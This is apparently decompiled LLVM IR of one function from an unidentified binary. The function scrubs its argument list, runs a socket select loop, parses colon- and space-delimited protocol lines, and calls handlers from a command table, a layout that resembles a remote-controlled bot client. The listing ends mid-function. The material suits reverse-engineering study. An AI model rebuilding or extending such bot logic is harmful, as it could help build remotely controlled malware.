define i32 @function_100040b8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100040b8:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-5144 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-6432 = alloca i32, align 4
  %stack_var_-6744 = alloca i32, align 4
  %stack_var_-6168 = alloca i32, align 4
  %stack_var_-6424 = alloca i32, align 4
  %stack_var_-6688 = alloca i32, align 4
  store i32 268452084, i32* @lr, align 4
  %v3_100040f0 = call i32 @function_10004f90(i32 ptrtoint ([19 x i8]* @global_var_1000e228.175 to i32), i32 ptrtoint (i32* @global_var_1000d3f0.18 to i32))
  %v3_10004100 = icmp eq i32 %v3_100040f0, 0
  br i1 %v3_10004100, label %dec_label_pc_10004108, label %dec_label_pc_1000412c

dec_label_pc_10004108:                            ; preds = %dec_label_pc_100040b8
  store i32 268452132, i32* @lr, align 4
  %v3_10004120 = call i32 @function_10004f90(i32 ptrtoint ([13 x i8]* @global_var_1000e23c.176 to i32), i32 ptrtoint (i32* @global_var_1000d3f0.18 to i32))
  br label %dec_label_pc_1000412c

dec_label_pc_1000412c:                            ; preds = %dec_label_pc_100040b8, %dec_label_pc_10004108
  %stack_var_-6704.0 = phi i32 [ %v3_10004120, %dec_label_pc_10004108 ], [ %v3_100040f0, %dec_label_pc_100040b8 ]
  %stack_var_-6700.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000e23c.176, i32 0, i32 0), %dec_label_pc_10004108 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1000e228.175, i32 0, i32 0), %dec_label_pc_100040b8 ]
  %v3_10004130 = icmp eq i32 %stack_var_-6704.0, 0
  br i1 %v3_10004130, label %dec_label_pc_100042ac, label %dec_label_pc_10004138

dec_label_pc_10004138:                            ; preds = %dec_label_pc_1000412c
  %v2_1000413c = load i32, i32* %arg2, align 4
  store i32 %v2_1000413c, i32* @r3, align 4
  %v0_10004144 = call i32 @function_10007284()
  %v2_10004158 = ptrtoint i32* %stack_var_-6688 to i32
  store i32 268452200, i32* @lr, align 4
  %v2_10004164 = call i32 @function_10004b44(i32 %v2_10004158, i32 256)
  store i32 ptrtoint (i32* @global_var_1000e24c.177 to i32), i32* @r4, align 4
  %v2_10004178 = bitcast i32* %stack_var_-6688 to i8*
  %v3_10004178 = call i32 @function_10007230(i8* %v2_10004178, i32 ptrtoint (i32* @global_var_1000e24c.177 to i32))
  %v3_10004180 = icmp eq i32 %v3_10004178, 0
  br i1 %v3_10004180, label %dec_label_pc_100042a4, label %dec_label_pc_10004198.preheader

dec_label_pc_10004198.preheader:                  ; preds = %dec_label_pc_10004138
  %v2_1000419c103 = load i32, i32* %arg2, align 4
  %v2_100041a4104 = add i32 %v2_1000419c103, %v0_10004144
  %v1_100041a8105 = inttoptr i32 %v2_100041a4104 to i8*
  %v2_100041a8106 = load i8, i8* %v1_100041a8105, align 1
  %v3_100041b0110 = icmp eq i8 %v2_100041a8106, 47
  br i1 %v3_100041b0110, label %dec_label_pc_100041b8, label %dec_label_pc_1000418c

dec_label_pc_1000418c:                            ; preds = %dec_label_pc_10004198.preheader, %dec_label_pc_1000418c
  %stack_var_-6708.0111 = phi i32 [ %v1_10004190, %dec_label_pc_1000418c ], [ %v0_10004144, %dec_label_pc_10004198.preheader ]
  %v1_10004190 = add i32 %stack_var_-6708.0111, -1
  %v2_1000419c = load i32, i32* %arg2, align 4
  %v2_100041a4 = add i32 %v2_1000419c, %v1_10004190
  %v1_100041a8 = inttoptr i32 %v2_100041a4 to i8*
  %v2_100041a8 = load i8, i8* %v1_100041a8, align 1
  %v3_100041b0 = icmp eq i8 %v2_100041a8, 47
  br i1 %v3_100041b0, label %dec_label_pc_100041b8, label %dec_label_pc_1000418c

dec_label_pc_100041b8:                            ; preds = %dec_label_pc_1000418c, %dec_label_pc_10004198.preheader
  %stack_var_-6708.0.lcssa = phi i32 [ %v0_10004144, %dec_label_pc_10004198.preheader ], [ %v1_10004190, %dec_label_pc_1000418c ]
  %v2_100041bc = load i32, i32* %arg2, align 4
  %v2_100041c4 = add i32 %v2_100041bc, %stack_var_-6708.0.lcssa
  %v2_100041c8 = ptrtoint i32* %stack_var_-6424 to i32
  store i32 %v2_100041c8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100041ec.179 to i32), i32* @lr, align 4
  %v6_100041e8 = call i32 @function_10004fac(i32 %v2_100041c8, i32 ptrtoint ([8 x i8]* @global_var_1000e250.178 to i32), i32 %v2_10004158, i32 %v2_100041c4)
  %v2_100041f0 = ptrtoint i32* %stack_var_-6168 to i32
  br label %dec_label_pc_10004230.outer

dec_label_pc_100041f0:                            ; preds = %dec_label_pc_10004230
  store i32 268452356, i32* @lr, align 4
  %v3_10004200 = call i32 @function_1000694c(i32 %v2_100041f0, i32 1024, i32 %stack_var_-6704.0)
  store i32 %v2_100041f0, i32* @r3, align 4
  store i32 %v2_100041c8, i32* @r4, align 4
  %v2_10004214 = call i32 @function_1000770c(i32 %v2_100041f0, i32 %v2_100041c8)
  %v3_1000421c = icmp eq i32 %v2_10004214, 0
  br i1 %v3_1000421c, label %dec_label_pc_10004224, label %dec_label_pc_10004230

dec_label_pc_10004224:                            ; preds = %dec_label_pc_100041f0
  %v1_10004228 = add i32 %stack_var_-6712.0.ph, 1
  br label %dec_label_pc_10004230.outer

dec_label_pc_10004230.outer:                      ; preds = %dec_label_pc_10004224, %dec_label_pc_100041b8
  %stack_var_-6712.0.ph = phi i32 [ %v1_10004228, %dec_label_pc_10004224 ], [ 0, %dec_label_pc_100041b8 ]
  br label %dec_label_pc_10004230

dec_label_pc_10004230:                            ; preds = %dec_label_pc_10004230.outer, %dec_label_pc_100041f0
  store i32 268452408, i32* @lr, align 4
  %v1_10004234 = call i32 @function_100068d0(i32 %stack_var_-6704.0)
  %v3_1000423c = icmp eq i32 %v1_10004234, 0
  br i1 %v3_1000423c, label %dec_label_pc_100041f0, label %dec_label_pc_10004244

dec_label_pc_10004244:                            ; preds = %dec_label_pc_10004230
  %v3_10004248 = icmp eq i32 %stack_var_-6712.0.ph, 0
  br i1 %v3_10004248, label %dec_label_pc_10004250, label %dec_label_pc_10004298

dec_label_pc_10004250:                            ; preds = %dec_label_pc_10004244
  store i32 268452440, i32* @lr, align 4
  %v1_10004254 = inttoptr i32 %stack_var_-6704.0 to i16*
  %v2_10004254 = call i32 @function_10004e44(i16* %v1_10004254)
  %v4_10004258 = ptrtoint i8* %stack_var_-6700.0 to i32
  store i32 268452456, i32* @lr, align 4
  %v3_10004264 = call i32 @function_10004f90(i32 %v4_10004258, i32 ptrtoint (i32* @global_var_1000e258.180 to i32))
  %v3_10004274 = icmp eq i32 %v3_10004264, 0
  br i1 %v3_10004274, label %dec_label_pc_100042ac, label %dec_label_pc_1000427c

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004250
  store i32 268452492, i32* @lr, align 4
  %v2_10004288 = call i32 @function_10006aac(i32 %v2_100041c8, i32 %v3_10004264)
  store i32 ptrtoint (i32* @global_var_10004294.181 to i32), i32* @lr, align 4
  %v1_10004290 = inttoptr i32 %v3_10004264 to i16*
  %v2_10004290 = call i32 @function_10004e44(i16* %v1_10004290)
  br label %dec_label_pc_100042ac

dec_label_pc_10004298:                            ; preds = %dec_label_pc_10004244
  store i32 ptrtoint (i32* @global_var_100042a0.182 to i32), i32* @lr, align 4
  %v1_1000429c = inttoptr i32 %stack_var_-6704.0 to i16*
  %v2_1000429c = call i32 @function_10004e44(i16* %v1_1000429c)
  br label %dec_label_pc_100042ac

dec_label_pc_100042a4:                            ; preds = %dec_label_pc_10004138
  store i32 ptrtoint (i32* @global_var_100042ac.183 to i32), i32* @lr, align 4
  %v1_100042a8 = inttoptr i32 %stack_var_-6704.0 to i16*
  %v2_100042a8 = call i32 @function_10004e44(i16* %v1_100042a8)
  br label %dec_label_pc_100042ac

dec_label_pc_100042ac:                            ; preds = %dec_label_pc_10004250, %dec_label_pc_1000412c, %dec_label_pc_10004298, %dec_label_pc_1000427c, %dec_label_pc_100042a4
  store i32 268452528, i32* @lr, align 4
  %v0_100042ac = call i32 @function_10004afc()
  %v3_100042b4 = icmp eq i32 %v0_100042ac, 0
  br i1 %v3_100042b4, label %dec_label_pc_100042c4, label %dec_label_pc_100042bc

dec_label_pc_100042bc:                            ; preds = %dec_label_pc_100042ac
  %v0_100042c0 = call i32 @function_10008dd4()
  br label %dec_label_pc_100042c4

dec_label_pc_100042c4:                            ; preds = %dec_label_pc_100042ac, %dec_label_pc_100042bc
  %v2_100042c8 = load i32, i32* %arg2, align 4
  store i32 %v2_100042c8, i32* @r3, align 4
  %v0_100042d8 = call i32 @function_10007284()
  store i32 ptrtoint ([6 x i8]* @global_var_1000e25c.184 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_100042f4.185 to i32), i32* @lr, align 4
  %v4_100042f0 = call i32 @function_10007414(i32 %v2_100042c8, i32 ptrtoint ([6 x i8]* @global_var_1000e25c.184 to i32), i32 %v0_100042d8)
  %v2_1000436048 = icmp sgt i32 %arg1, 1
  br i1 %v2_1000436048, label %dec_label_pc_10004300, label %dec_label_pc_10004368

dec_label_pc_10004300:                            ; preds = %dec_label_pc_100042c4, %dec_label_pc_10004300
  %storemerge1051 = phi i32 [ %v1_10004350, %dec_label_pc_10004300 ], [ 1, %dec_label_pc_100042c4 ]
  %v1_10004304 = mul i32 %storemerge1051, 4
  %v2_10004310 = add i32 %v1_10004304, %tmp
  %v1_10004314 = inttoptr i32 %v2_10004310 to i32*
  %v2_10004314 = load i32, i32* %v1_10004314, align 4
  store i32 %v2_10004314, i32* @r3, align 4
  %v0_10004334 = call i32 @function_10007284()
  store i32 268452684, i32* @lr, align 4
  %v3_10004348 = call i32 @function_100071a0(i32 %v2_10004314, i32 0, i32 %v0_10004334)
  %v1_10004350 = add nuw nsw i32 %storemerge1051, 1
  %v2_10004360 = icmp slt i32 %v1_10004350, %arg1
  br i1 %v2_10004360, label %dec_label_pc_10004300, label %dec_label_pc_10004368

dec_label_pc_10004368:                            ; preds = %dec_label_pc_10004300, %dec_label_pc_100042c4
  store i32 268452720, i32* @lr, align 4
  %v1_1000436c = call i32 @function_10004d80(i32 0)
  store i32 268452728, i32* @lr, align 4
  %v0_10004374 = call i32 @function_10004c60()
  %v2_1000437c = xor i32 %v1_1000436c, %v0_10004374
  store i32 268452740, i32* @lr, align 4
  %v0_10004380 = call i32 @function_10004ca8()
  %v2_10004388 = add i32 %v2_1000437c, %v0_10004380
  store i32 268452756, i32* @lr, align 4
  %v1_10004390 = call i32 @function_10008850(i32 %v2_10004388)
  store i32 268452760, i32* @lr, align 4
  %v0_10004394 = call i32 @function_100007d4()
  store i32 %v0_10004394, i32* @global_var_10010474.145, align 4
  store i32 268452776, i32* @lr, align 4
  %v0_100043a4 = call i32 @function_100007d4()
  store i32 %v0_100043a4, i32* @global_var_10010470.19, align 4
  store i32 268452792, i32* @lr, align 4
  %v0_100043b4 = call i32 @function_100007d4()
  store i32 %v0_100043b4, i32* @global_var_1001047c.186, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1000e264.187 to i32), i32* @global_var_10010488.143, align 4
  store i32 ptrtoint (i32* @global_var_1000e268.188 to i32), i32* @global_var_10010484.159, align 4
  store i32 0, i32* @global_var_10010480.106, align 4
  %v2_1000443c = ptrtoint i32* %stack_var_-6424 to i32
  %v2_10004494 = ptrtoint i32* %stack_var_-6744 to i32
  %v2_10004498 = add i32 %v2_10004494, 320
  %v2_100044f0 = ptrtoint i32* %stack_var_-6432 to i32
  %v2_10004704 = ptrtoint i32* %stack_var_-4120 to i32
  %v2_100047f0 = ptrtoint i32* %stack_var_-5144 to i32
  %v2_10004898 = ptrtoint i32* %stack_var_-6168 to i32
  %v2_10004738 = add i32 %v2_10004494, 2624
  br label %dec_label_pc_100043f4

dec_label_pc_100043f4:                            ; preds = %dec_label_pc_10004480, %dec_label_pc_100046fc, %dec_label_pc_10004970, %dec_label_pc_10004368
  store i32 268452856, i32* @lr, align 4
  %v0_100043f4 = call i32 @function_10003dbc()
  %v3_100043fc = load i32, i32* @global_var_10010478.10, align 4
  %v3_10004404 = load i32, i32* @global_var_10010474.145, align 4
  %v3_1000440c = load i32, i32* @global_var_10010470.19, align 4
  %v7_10004434 = call i32 @function_1000041c(i32 %v3_100043fc, i32 ptrtoint ([41 x i8]* @global_var_1000e26c.189 to i32), i32 %v3_10004404, i32 %v3_1000440c)
  br label %dec_label_pc_1000443c

dec_label_pc_1000443c:                            ; preds = %dec_label_pc_100046bc, %dec_label_pc_10004730, %dec_label_pc_10004990, %dec_label_pc_100049b4, %dec_label_pc_100043f4
  br label %dec_label_pc_10004450

dec_label_pc_10004450:                            ; preds = %dec_label_pc_1000443c, %dec_label_pc_10004450
  %storemerge1123 = phi i32 [ 0, %dec_label_pc_1000443c ], [ %v1_1000446c, %dec_label_pc_10004450 ]
  %v1_10004458 = mul nuw nsw i32 %storemerge1123, 4
  %v2_1000445c = add i32 %v1_10004458, %v2_1000443c
  %v2_10004464 = inttoptr i32 %v2_1000445c to i32*
  store i32 0, i32* %v2_10004464, align 4
  %v1_1000446c = add nuw nsw i32 %storemerge1123, 1
  %tmp79 = icmp ult i32 %v1_1000446c, 32
  br i1 %tmp79, label %dec_label_pc_10004450, label %dec_label_pc_10004480

dec_label_pc_10004480:                            ; preds = %dec_label_pc_10004450
  %v3_10004484 = load i32, i32* @global_var_10010478.10, align 4
  %v1_10004488 = udiv i32 %v3_10004484, 32
  %v1_10004490 = mul nuw nsw i32 %v1_10004488, 4
  %v1_1000449c = add i32 %v1_10004490, %v2_10004498
  %v1_100044a0 = inttoptr i32 %v1_1000449c to i32*
  %v2_100044a0 = load i32, i32* %v1_100044a0, align 4
  %v1_100044ac = urem i32 %v3_10004484, 32
  %v3_100044b4 = shl i32 1, %v1_100044ac
  %v2_100044b8 = or i32 %v2_100044a0, %v3_100044b4
  store i32 %v2_100044b8, i32* %v1_100044a0, align 4
  store i32 1200, i32* %stack_var_-6432, align 4
  %v3_100044e4 = load i32, i32* @global_var_10010478.10, align 4
  %v1_100044e8 = add i32 %v3_100044e4, 1
  store i32 268453132, i32* @lr, align 4
  %v6_10004508 = call i32 @function_10004d38(i32 %v1_100044e8, i32 %v2_1000443c, i32 0, i32 0, i32 %v2_100044f0, i32 %v2_1000443c)
  %tmp80 = icmp slt i32 %v6_10004508, 1
  br i1 %tmp80, label %dec_label_pc_100043f4, label %dec_label_pc_100046a8.preheader

dec_label_pc_100046a8.preheader:                  ; preds = %dec_label_pc_10004480
  %v3_100046ac28 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100046b429 = icmp eq i32 %v3_100046ac28, 0
  br i1 %v2_100046b429, label %dec_label_pc_100046bc, label %dec_label_pc_10004524

dec_label_pc_10004524:                            ; preds = %dec_label_pc_100046a8.preheader, %dec_label_pc_1000469c
  %storemerge1231 = phi i32 [ %.pre, %dec_label_pc_1000469c ], [ 0, %dec_label_pc_100046a8.preheader ]
  %v1_10004528 = mul i32 %storemerge1231, 4
  %v3_10004534 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004538 = add i32 %v3_10004534, %v1_10004528
  %v1_1000453c = inttoptr i32 %v2_10004538 to i32*
  %v2_1000453c = load i32, i32* %v1_1000453c, align 4
  store i32 268453200, i32* @lr, align 4
  %v3_1000454c = call i32 @function_10004dc8(i32 %v2_1000453c, i32 0, i32 1)
  %tmp81 = icmp slt i32 %v3_1000454c, 1
  %.pre = add i32 %storemerge1231, 1
  br i1 %tmp81, label %dec_label_pc_1000469c, label %dec_label_pc_100045b4.preheader

dec_label_pc_100045b4.preheader:                  ; preds = %dec_label_pc_10004524
  %v3_100045b885 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100045c086 = icmp ult i32 %.pre, %v3_100045b885
  %v1_1000457087 = mul i32 %.pre, 4
  %v3_1000457c88 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_1000458089 = add i32 %v3_1000457c88, %v1_1000457087
  br i1 %v2_100045c086, label %dec_label_pc_1000456c, label %dec_label_pc_100045c8

dec_label_pc_1000456c:                            ; preds = %dec_label_pc_100045b4.preheader, %dec_label_pc_1000456c
  %v2_1000458093 = phi i32 [ %v2_10004580, %dec_label_pc_1000456c ], [ %v2_1000458089, %dec_label_pc_100045b4.preheader ]
  %v1_1000456090 = phi i32 [ %v1_10004560, %dec_label_pc_1000456c ], [ %.pre, %dec_label_pc_100045b4.preheader ]
  %v1_10004584 = add i32 %v2_1000458093, -4
  %v1_100045a0 = inttoptr i32 %v2_1000458093 to i32*
  %v2_100045a0 = load i32, i32* %v1_100045a0, align 4
  %v2_100045a4 = inttoptr i32 %v1_10004584 to i32*
  store i32 %v2_100045a0, i32* %v2_100045a4, align 4
  %v1_10004560 = add i32 %v1_1000456090, 1
  %v3_100045b8 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100045c0 = icmp ult i32 %v1_10004560, %v3_100045b8
  %v1_10004570 = mul i32 %v1_10004560, 4
  %v3_1000457c = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004580 = add i32 %v3_1000457c, %v1_10004570
  br i1 %v2_100045c0, label %dec_label_pc_1000456c, label %dec_label_pc_100045c8

dec_label_pc_100045c8:                            ; preds = %dec_label_pc_1000456c, %dec_label_pc_100045b4.preheader
  %v2_10004580.lcssa = phi i32 [ %v2_1000458089, %dec_label_pc_100045b4.preheader ], [ %v2_10004580, %dec_label_pc_1000456c ]
  %v1_100045e0 = add i32 %v2_10004580.lcssa, -4
  %v2_100045e8 = inttoptr i32 %v1_100045e0 to i32*
  store i32 0, i32* %v2_100045e8, align 4
  %v3_100045f0 = load i32, i32* @global_var_10010468.13, align 4
  %v1_100045f4 = add i32 %v3_100045f0, -1
  store i32 %v1_100045f4, i32* @global_var_10010468.13, align 4
  %v1_10004608 = mul i32 %v1_100045f4, 4
  %v1_1000460c = add i32 %v1_10004608, 4
  store i32 %v1_1000460c, i32* @r3, align 4
  store i32 268453400, i32* @lr, align 4
  %v0_10004614 = call i32 @function_1000809c()
  %v3_1000467024 = load i32, i32* @global_var_10010468.13, align 4
  %v2_1000467825 = icmp eq i32 %v3_1000467024, 0
  br i1 %v2_1000467825, label %dec_label_pc_10004680, label %dec_label_pc_1000462c

dec_label_pc_1000462c:                            ; preds = %dec_label_pc_100045c8, %dec_label_pc_1000462c
  %storemerge1927 = phi i32 [ %v1_10004664, %dec_label_pc_1000462c ], [ 0, %dec_label_pc_100045c8 ]
  %v1_10004630 = mul i32 %storemerge1927, 4
  %v2_1000463c = add i32 %v1_10004630, %v0_10004614
  %v3_10004650 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004654 = add i32 %v3_10004650, %v1_10004630
  %v1_10004658 = inttoptr i32 %v2_10004654 to i32*
  %v2_10004658 = load i32, i32* %v1_10004658, align 4
  %v2_1000465c = inttoptr i32 %v2_1000463c to i32*
  store i32 %v2_10004658, i32* %v2_1000465c, align 4
  %v1_10004664 = add i32 %storemerge1927, 1
  %v3_10004670 = load i32, i32* @global_var_10010468.13, align 4
  %v2_10004678 = icmp ult i32 %v1_10004664, %v3_10004670
  br i1 %v2_10004678, label %dec_label_pc_1000462c, label %dec_label_pc_1000466c.dec_label_pc_10004680_crit_edge

dec_label_pc_1000466c.dec_label_pc_10004680_crit_edge: ; preds = %dec_label_pc_1000462c
  br label %dec_label_pc_10004680

dec_label_pc_10004680:                            ; preds = %dec_label_pc_100045c8, %dec_label_pc_1000466c.dec_label_pc_10004680_crit_edge
  %v3_10004684 = load i32, i32* @global_var_1001048c.14, align 4
  store i32 %v3_10004684, i32* @r3, align 4
  store i32 268453520, i32* @lr, align 4
  %v0_1000468c = call i32 @function_100081f4()
  store i32 %v0_10004614, i32* @global_var_1001048c.14, align 4
  br label %dec_label_pc_1000469c

dec_label_pc_1000469c:                            ; preds = %dec_label_pc_10004524, %dec_label_pc_10004680
  %v3_100046ac = load i32, i32* @global_var_10010468.13, align 4
  %v2_100046b4 = icmp ult i32 %.pre, %v3_100046ac
  br i1 %v2_100046b4, label %dec_label_pc_10004524, label %dec_label_pc_100046bc

dec_label_pc_100046bc:                            ; preds = %dec_label_pc_100046a8.preheader, %dec_label_pc_1000469c
  %v3_100046c0 = load i32, i32* @global_var_10010478.10, align 4
  %v1_100046c4 = udiv i32 %v3_100046c0, 32
  %v1_100046c8 = mul nuw nsw i32 %v1_100046c4, 4
  %v1_100046d4 = add i32 %v1_100046c8, %v2_10004498
  %v1_100046d8 = inttoptr i32 %v1_100046d4 to i32*
  %v2_100046d8 = load i32, i32* %v1_100046d8, align 4
  %v1_100046e4 = urem i32 %v3_100046c0, 32
  %v3_100046e8 = sub i32 0, %v3_100046c0
  %v4_100046e8 = urem i32 %v3_100046e8, 32
  %v5_100046e8 = shl i32 %v2_100046d8, %v4_100046e8
  %v6_100046e8 = xor i32 %v4_100046e8, 31
  %v7_100046e8 = lshr i32 %v2_100046d8, %v6_100046e8
  %v8_100046e8 = udiv i32 %v7_100046e8, 2
  %v9_100046e8 = or i32 %v8_100046e8, %v5_100046e8
  %v12_100046e8 = lshr i32 -1, %v1_100046e4
  %tmp116 = icmp slt i32 %v2_100046d8, 0
  %v15_100046e820 = zext i1 %tmp116 to i32
  %v16_100046e8 = xor i32 %v12_100046e8, 1
  %v17_100046e8 = and i32 %v15_100046e820, %v16_100046e8
  %v14_100046e8 = urem i32 %v12_100046e8, 2
  %v14_100046e8.masked = and i32 %v14_100046e8, %v9_100046e8
  %v1_100046f0 = or i32 %v14_100046e8.masked, %v17_100046e8
  %v3_100046f4 = icmp eq i32 %v1_100046f0, 0
  br i1 %v3_100046f4, label %dec_label_pc_1000443c, label %dec_label_pc_100046fc

dec_label_pc_100046fc:                            ; preds = %dec_label_pc_100046bc
  store i32 268453660, i32* @lr, align 4
  %v4_10004718 = call i32 @function_10007fb4(i32 %v3_100046c0, i32 %v2_10004704, i32 4096, i32 0)
  store i32 %v4_10004718, i32* %stack_var_-6744, align 4
  %tmp82 = icmp slt i32 %v4_10004718, 1
  br i1 %tmp82, label %dec_label_pc_100043f4, label %dec_label_pc_10004730

dec_label_pc_10004730:                            ; preds = %dec_label_pc_100046fc
  %v3_10004740 = add i32 %v2_10004738, %v4_10004718
  %v4_10004740 = inttoptr i32 %v3_10004740 to i8*
  store i8 0, i8* %v4_10004740, align 1
  store i32 ptrtoint (i32* @global_var_1000e298.191 to i32), i32* @r4, align 4
  store i32 268453720, i32* @lr, align 4
  %v3_10004754 = call i32 @function_100077ac(i32 %v2_10004704, i32 ptrtoint (i32* @global_var_1000e298.191 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100049ac45 = icmp eq i32 %v3_10004754, 0
  br i1 %v3_100049ac45, label %dec_label_pc_1000443c, label %dec_label_pc_100049b4

dec_label_pc_10004764:                            ; preds = %dec_label_pc_100049b4
  store i32 268453740, i32* @lr, align 4
  %v2_10004768 = call i32 @function_10000724(i32 %storemerge47.in)
  %v2_10004770 = load i8, i8* %storemerge47, align 1
  %v3_10004778 = icmp eq i8 %v2_10004770, 58
  br i1 %v3_10004778, label %dec_label_pc_10004798.preheader, label %dec_label_pc_10004824

dec_label_pc_10004798.preheader:                  ; preds = %dec_label_pc_10004764
  store i32 0, i32* %stack_var_-6744, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_100047a032 = call i32 @function_10007284()
  %v2_100047a834 = icmp eq i32 %v0_100047a032, 0
  br i1 %v2_100047a834, label %dec_label_pc_100047d0, label %dec_label_pc_100047b0

dec_label_pc_1000478c:                            ; preds = %dec_label_pc_100047b0
  %v1_10004790 = add i32 %v3_100047b0, 1
  store i32 %v1_10004790, i32* %stack_var_-6744, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_100047a0 = call i32 @function_10007284()
  %v2_100047a8 = icmp ult i32 %v1_10004790, %v0_100047a0
  br i1 %v2_100047a8, label %dec_label_pc_100047b0, label %dec_label_pc_100047d0

dec_label_pc_100047b0:                            ; preds = %dec_label_pc_10004798.preheader, %dec_label_pc_1000478c
  %v3_100047b0 = load i32, i32* %stack_var_-6744, align 4
  %v2_100047bc = add i32 %v3_100047b0, %storemerge47.in
  %v1_100047c0 = inttoptr i32 %v2_100047bc to i8*
  %v2_100047c0 = load i8, i8* %v1_100047c0, align 1
  %v3_100047c8 = icmp eq i8 %v2_100047c0, 32
  br i1 %v3_100047c8, label %dec_label_pc_100047d0, label %dec_label_pc_1000478c

dec_label_pc_100047d0:                            ; preds = %dec_label_pc_10004798.preheader, %dec_label_pc_1000478c, %dec_label_pc_100047b0
  %v3_100047d0 = load i32, i32* %stack_var_-6744, align 4
  %v2_100047dc = add i32 %v3_100047d0, %storemerge47.in
  %v3_100047e4 = inttoptr i32 %v2_100047dc to i8*
  store i8 0, i8* %v3_100047e4, align 1
  %v1_100047ec = add i32 %storemerge47.in, 1
  %v2_100047fc = inttoptr i32 %v1_100047ec to i8*
  %v3_100047fc = call i32 @function_10007264(i32 %v2_100047f0, i8* %v2_100047fc)
  %v3_10004800 = load i32, i32* %stack_var_-6744, align 4
  %v2_1000480c = add i32 %v3_10004800, %storemerge47.in
  %v1_10004810 = add i32 %v2_1000480c, 1
  %v3_1000481c = inttoptr i32 %v1_10004810 to i8*
  %v4_1000481c = call i32 @function_10007264(i32 %storemerge47.in, i8* %v3_1000481c)
  br label %dec_label_pc_10004848.preheader

dec_label_pc_10004824:                            ; preds = %dec_label_pc_10004764
  store i32 10752, i32* %stack_var_-5144, align 4
  br label %dec_label_pc_10004848.preheader

dec_label_pc_10004848.preheader:                  ; preds = %dec_label_pc_100047d0, %dec_label_pc_10004824
  store i32 0, i32* %stack_var_-6744, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_1000485037 = call i32 @function_10007284()
  %v2_1000485839 = icmp eq i32 %v0_1000485037, 0
  br i1 %v2_1000485839, label %dec_label_pc_10004880, label %dec_label_pc_10004860

dec_label_pc_1000483c:                            ; preds = %dec_label_pc_10004860
  %v1_10004840 = add i32 %v3_10004860, 1
  store i32 %v1_10004840, i32* %stack_var_-6744, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10004850 = call i32 @function_10007284()
  %v2_10004858 = icmp ult i32 %v1_10004840, %v0_10004850
  br i1 %v2_10004858, label %dec_label_pc_10004860, label %dec_label_pc_10004880

dec_label_pc_10004860:                            ; preds = %dec_label_pc_10004848.preheader, %dec_label_pc_1000483c
  %v3_10004860 = load i32, i32* %stack_var_-6744, align 4
  %v2_1000486c = add i32 %v3_10004860, %storemerge47.in
  %v1_10004870 = inttoptr i32 %v2_1000486c to i8*
  %v2_10004870 = load i8, i8* %v1_10004870, align 1
  %v3_10004878 = icmp eq i8 %v2_10004870, 32
  br i1 %v3_10004878, label %dec_label_pc_10004880, label %dec_label_pc_1000483c

dec_label_pc_10004880:                            ; preds = %dec_label_pc_10004848.preheader, %dec_label_pc_1000483c, %dec_label_pc_10004860
  %v3_10004880 = load i32, i32* %stack_var_-6744, align 4
  %v2_1000488c = add i32 %v3_10004880, %storemerge47.in
  %v3_10004894 = inttoptr i32 %v2_1000488c to i8*
  store i8 0, i8* %v3_10004894, align 1
  %v4_100048a4 = call i32 @function_10007264(i32 %v2_10004898, i8* %storemerge47)
  %v3_100048a8 = load i32, i32* %stack_var_-6744, align 4
  %v2_100048b4 = add i32 %v3_100048a8, %storemerge47.in
  %v1_100048b8 = add i32 %v2_100048b4, 1
  %v3_100048c4 = inttoptr i32 %v1_100048b8 to i8*
  %v4_100048c4 = call i32 @function_10007264(i32 %storemerge47.in, i8* %v3_100048c4)
  store i32 0, i32* %stack_var_-6744, align 4
  %v2_1000496496 = load i32, i32* bitcast ([4 x i8]** @global_var_100100a4.195 to i32*), align 4
  %v3_1000496899 = icmp eq i32 %v2_1000496496, 0
  br i1 %v3_1000496899, label %dec_label_pc_10004970, label %dec_label_pc_100048d4

dec_label_pc_100048d4:                            ; preds = %dec_label_pc_10004880, %dec_label_pc_100048d4
  %v1_10004964102 = phi i32* [ %v1_10004964, %dec_label_pc_100048d4 ], [ bitcast ([4 x i8]** @global_var_100100a4.195 to i32*), %dec_label_pc_10004880 ]
  %v2_100048e8 = load i32, i32* %v1_10004964102, align 4
  store i32 %v2_100048e8, i32* @r3, align 4
  store i32 %v2_10004898, i32* @r4, align 4
  %v2_100048f8 = call i32 @function_1000770c(i32 %v2_100048e8, i32 %v2_10004898)
  %v3_10004908 = load i32, i32* %stack_var_-6744, align 4
  %v1_10004914 = mul i32 %v3_10004908, 8
  %v1_1000491c = add i32 %v1_10004914, add (i32 ptrtoint ([4 x i8]** @global_var_100100a4.195 to i32), i32 4)
  %v1_10004920 = inttoptr i32 %v1_1000491c to i32*
  %v2_10004920 = load i32, i32* %v1_10004920, align 4
  call void @__pseudo_call(i32 %v2_10004920)
  %v3_10004944 = load i32, i32* %stack_var_-6744, align 4
  %v1_10004948 = add i32 %v3_10004944, 1
  store i32 %v1_10004948, i32* %stack_var_-6744, align 4
  %v1_1000495c = mul i32 %v1_10004948, 8
  %v2_10004960 = add i32 %v1_1000495c, ptrtoint ([4 x i8]** @global_var_100100a4.195 to i32)
  %v1_10004964 = inttoptr i32 %v2_10004960 to i32*
  %v2_10004964 = load i32, i32* %v1_10004964, align 4
  %v3_10004968 = icmp eq i32 %v2_10004964, 0
  br i1 %v3_10004968, label %dec_label_pc_10004970, label %dec_label_pc_100048d4

dec_label_pc_10004970:                            ; preds = %dec_label_pc_100048d4, %dec_label_pc_10004880
  store i32 %v2_10004898, i32* @r3, align 4
